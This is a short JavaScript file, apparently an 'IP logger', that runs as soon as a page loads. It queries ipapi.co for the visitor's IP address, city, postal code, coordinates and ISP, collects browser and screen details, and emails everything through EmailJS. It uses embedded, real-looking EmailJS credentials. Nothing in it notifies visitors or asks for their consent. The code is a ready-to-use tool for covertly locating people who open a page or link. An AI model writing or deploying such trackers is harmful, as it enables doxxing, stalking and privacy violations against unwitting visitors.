// This script collects device/browser info and sends it via EmailJS
// IMPORTANT: Replace the placeholders with your EmailJS credentials

// EmailJS Initialization - You need to sign up and get your credentials
// See https://www.emailjs.com/docs/sdk/installation/
(function(){
    emailjs.init("VcalrjM3vIz1HQLCG"); // <-- Replace with your EmailJS user ID
})();

// Function to get IP and location info from ipapi.co
function getIpInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .catch(() => ({
            ip: "Unavailable",
            network: "",
            version: "",
            city: "",
            region: "",
            region_code: "",
            country: "",
            country_name: "",
            country_code: "",
            country_code_iso3: "",
            country_capital: "",
            country_tld: "",
            continent_code: "",
            in_eu: "",
            postal: "",
            latitude: "",
            longitude: "",
            timezone: "",
            utc_offset: "",
            country_calling_code: "",
            currency: "",
            currency_name: "",
            languages: "",
            country_area: "",
            country_population: "",
            asn: "",
            org: ""
        }));
}

// Function to get device info
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screen: {
            width: window.screen.width,
            height: window.screen.height,
            availWidth: window.screen.availWidth,
            availHeight: window.screen.availHeight,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        online: navigator.onLine
    };
}

// Main execution
getIpInfo().then(ipInfo => {
    const deviceInfo = getDeviceInfo();

    emailjs.send("service_5fifa81", "service_5fifa81", {
        ip: ipInfo.ip,
        network: ipInfo.network,
        version: ipInfo.version,
        city: ipInfo.city,
        region: ipInfo.region,
        region_code: ipInfo.region_code,
        country: ipInfo.country,
        country_name: ipInfo.country_name,
        country_code: ipInfo.country_code,
        country_code_iso3: ipInfo.country_code_iso3,
        country_capital: ipInfo.country_capital,
        country_tld: ipInfo.country_tld,
        continent_code: ipInfo.continent_code,
        in_eu: ipInfo.in_eu,
        postal: ipInfo.postal,
        latitude: ipInfo.latitude,
        longitude: ipInfo.longitude,
        timezone: ipInfo.timezone,
        utc_offset: ipInfo.utc_offset,
        country_calling_code: ipInfo.country_calling_code,
        currency: ipInfo.currency,
        currency_name: ipInfo.currency_name,
        languages: ipInfo.languages,
        country_area: ipInfo.country_area,
        country_population: ipInfo.country_population,
        asn: ipInfo.asn,
        org: ipInfo.org,

        userAgent: deviceInfo.userAgent,
        platform: deviceInfo.platform,
        language: deviceInfo.language,
        cookiesEnabled: deviceInfo.cookiesEnabled,
        screen: JSON.stringify(deviceInfo.screen),
        online: deviceInfo.online
    })
    .then(() => {
        if (document.getElementById("log-status")) {
            document.getElementById("log-status").innerText = "Log sent successfully!";
        }
    })
    .catch(error => {
        if (document.getElementById("log-status")) {
            document.getElementById("log-status").innerText = "Failed to send log: " + JSON.stringify(error);
        }
    });
}).catch(error => {
    if (document.getElementById("log-status")) {
        document.getElementById("log-status").innerText = "Failed to fetch IP info: " + JSON.stringify(error);
    }
});
